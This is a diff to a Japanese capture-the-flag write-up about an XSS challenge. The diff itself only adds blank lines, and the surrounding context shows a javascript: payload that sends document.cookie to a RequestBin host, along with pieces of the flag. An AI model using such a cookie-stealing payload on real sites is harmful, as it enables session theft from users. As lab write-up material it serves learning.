@@ -17,6 +17,7 @@ Wani Request 1 と同じくRequestBinなどを利用してみましょう。
 ## チャレンジ1
 
 まず1つ目のチャレンジ
+
 ![](s1.png)
 
 あどみんちゃんが
@@ -39,6 +40,7 @@ FLAG{y0u_4r3_x55
 
 ## チャレンジ2
 2つ目のチャレンジ
+
 ![](s3.png)
 
 入力したURLにアクセスするっぽい．
@@ -50,7 +52,9 @@ javascript:location.href="http://requestbin.net/r/b0xs5izm?"+document.cookie
 ```
 
 送信したらフラグの後半部分が送られてきた．
+
 ![](s4.png)
+
 -60d_c75a4c80cf07}
 
 合体させると一つのフラグになる．
